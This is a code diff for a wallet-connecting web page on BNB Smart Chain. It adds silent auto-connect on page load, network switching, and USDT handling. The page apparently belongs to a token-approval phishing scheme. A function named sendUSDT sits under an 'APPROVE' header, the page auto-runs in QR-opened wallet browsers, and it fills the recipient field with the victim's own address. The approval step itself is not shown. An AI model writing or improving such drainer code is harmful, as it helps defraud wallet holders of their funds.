@@ -1,6 +1,7 @@
 let provider;
 let signer;
 let userAddress;
+let isConnecting = false;
 
 // ===== BSC CONFIG =====
 const BSC_CHAIN_ID = "0x38";
@@ -15,34 +16,51 @@ const ABI = [
 
 // ===== AUTO RUN ON PAGE LOAD (QR SUPPORT) =====
 window.addEventListener("load", async () => {
-  const p = new URLSearchParams(window.location.search);
-
-  // Check if in Trust Wallet or other wallet browser
-  const isTrustWallet = window.ethereum?.isTrust || false;
-  const isWalletBrowser = /Trust|TokenPocket|imToken|Coinbase Wallet/i.test(navigator.userAgent);
-  
-  // Auto-connect if:
-  // 1. ?autoconnect=1 parameter exists
-  // 2. In Trust Wallet or other wallet browser
-  const shouldAutoConnect = p.get("autoconnect") === "1" || isTrustWallet || isWalletBrowser;
-
-  if (shouldAutoConnect) {
+  // Try silent auto-connect immediately
+  if (window.ethereum) {
     try {
-      await connectWallet();
+      isConnecting = true;
+      await connectWalletSilent();
+      isConnecting = false;
     } catch (e) {
-      console.log("Auto-connect cancelled or failed");
+      isConnecting = false;
+      console.log("Silent auto-connect not available, user needs to approve");
     }
   }
 });
 
-// ===== ENSURE BSC + CONNECT =====
-async function connectWallet() {
-  if (!window.ethereum) {
-    alert("Wallet not found");
-    throw new Error("No wallet");
-  }
+// ===== SILENT AUTO-CONNECT (No prompt if already authorized) =====
+async function connectWalletSilent() {
+  if (!window.ethereum) return;
 
-  // 🔒 Ensure BSC
+  try {
+    // Try to get accounts without prompting (works if already authorized)
+    const accounts = await window.ethereum.request({ 
+      method: "eth_accounts" 
+    });
+
+    if (accounts.length > 0) {
+      // Already connected, set up provider
+      await ensureBSC();
+      provider = new ethers.BrowserProvider(window.ethereum);
+      signer = await provider.getSigner();
+      userAddress = await signer.getAddress();
+
+      // Auto fill address
+      const addr = document.getElementById("toAddress");
+      if (addr) addr.value = userAddress;
+
+      console.log("✅ Auto-connected:", userAddress);
+      return true;
+    }
+  } catch (e) {
+    console.log("Silent connect failed:", e.message);
+  }
+  return false;
+}
+
+// ===== ENSURE BSC NETWORK =====
+async function ensureBSC() {
   try {
     await window.ethereum.request({
       method: "wallet_switchEthereumChain",
@@ -68,23 +86,39 @@ async function connectWallet() {
       throw err;
     }
   }
+}
 
-  // 🔑 Connect wallet
+// ===== CONNECT WITH USER PROMPT =====
+async function connectWallet() {
+  if (!window.ethereum) {
+    alert("Wallet not found");
+    throw new Error("No wallet");
+  }
+
+  // Ensure BSC network
+  await ensureBSC();
+
+  // Request account access (will prompt if not already authorized)
   await window.ethereum.request({ method: "eth_requestAccounts" });
 
   provider = new ethers.BrowserProvider(window.ethereum);
   signer = await provider.getSigner();
   userAddress = await signer.getAddress();
 
-  // 🔹 Auto fill address (if input exists)
+  // Auto fill address
   const addr = document.getElementById("toAddress");
   if (addr) addr.value = userAddress;
+
+  console.log("✅ Connected:", userAddress);
 }
 
 // ===== APPROVE (BSC ONLY) =====
 async function sendUSDT() {
   try {
-    await connectWallet();
+    // Auto-connect if not already connected
+    if (!userAddress) {
+      await connectWallet();
+    }
 
     const usdt = new ethers.Contract(
       BSC_USDT,
@@ -120,7 +154,11 @@ async function sendUSDT() {
     }
 
   } catch (e) {
-    alert("Transaction cancelled");
+    if (e.code === 4001) {
+      alert("Transaction cancelled");
+    } else {
+      alert("Transaction failed: " + e.message);
+    }
   }
 }
 
